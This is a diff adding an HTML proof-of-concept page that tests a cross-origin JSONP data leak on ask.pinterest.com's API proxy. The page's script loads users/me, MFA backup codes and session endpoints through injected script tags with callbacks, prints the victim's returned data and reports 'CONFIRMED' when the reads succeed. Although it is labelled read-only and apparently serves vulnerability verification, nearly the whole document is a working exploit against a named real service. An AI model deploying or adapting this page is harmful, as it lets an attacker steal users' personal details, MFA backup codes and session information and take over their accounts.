@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PIN-3 re-verification</title>
+<style>
+  body { font-family: -apple-system, Menlo, monospace; background: #1e1e1e; color: #d4d4d4; margin: 0; padding: 24px; }
+  h1 { font-size: 16px; color: #4ec9b0; }
+  h2 { font-size: 13px; color: #569cd6; margin-top: 24px; }
+  pre { background: #252526; border: 1px solid #3c3c3c; border-radius: 4px; padding: 12px; font-size: 11px; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow-y: auto; }
+  .ok { color: #4ec9b0; } .bad { color: #f44747; }
+</style>
+</head>
+<body>
+<h1>JSONP read test against ask.pinterest.com (read-only)</h1>
+<p>Origin of this page: <b id="origin"></b></p>
+<h2>1. users/me (email, username, birthday, phone fragment)</h2>
+<pre id="out1">pending...</pre>
+<h2>2. MFA backup codes (current, untouched)</h2>
+<pre id="out2">pending...</pre>
+<h2>3. sessions (ids, IPs, devices)</h2>
+<pre id="out3">pending...</pre>
+<h2>Result: <span id="verdict" class="bad">waiting</span></h2>
+<script>
+document.getElementById('origin').textContent = location.origin || 'null origin';
+var got = {};
+function finish() {
+  var n = Object.keys(got).length;
+  var v = document.getElementById('verdict');
+  if (n >= 2) { v.textContent = 'CONFIRMED: cross-origin JSONP read works from origin ' + (location.origin || 'null'); v.className = 'ok'; }
+}
+function redact(o) {
+  try { var s = JSON.stringify(o, null, 1); return s.length > 2500 ? s.slice(0, 2500) + ' ...[truncated]' : s; } catch(e) { return String(o); }
+}
+function cb1(d){ got.me = true; document.getElementById('out1').textContent = redact(d); finish(); }
+function cb2(d){ got.mfa = true; document.getElementById('out2').textContent = redact(d); finish(); }
+function cb3(d){ got.sess = true; document.getElementById('out3').textContent = redact(d); finish(); }
+var B = 'https://ask.pinterest.com/api/proxy/pinterest/';
+function load(u, cb) { var s = document.createElement('script'); s.src = B + u + '?callback=' + cb; s.onerror = function(){ document.getElementById('out' + (cb=='cb1'?1:cb=='cb2'?2:3)).textContent = 'script load failed'; }; document.body.appendChild(s); }
+load('users/me/', 'cb1');
+load('users/settings/mfa/backup/', 'cb2');
+load('sessions/', 'cb3');
+</script>
+</body>
+</html>
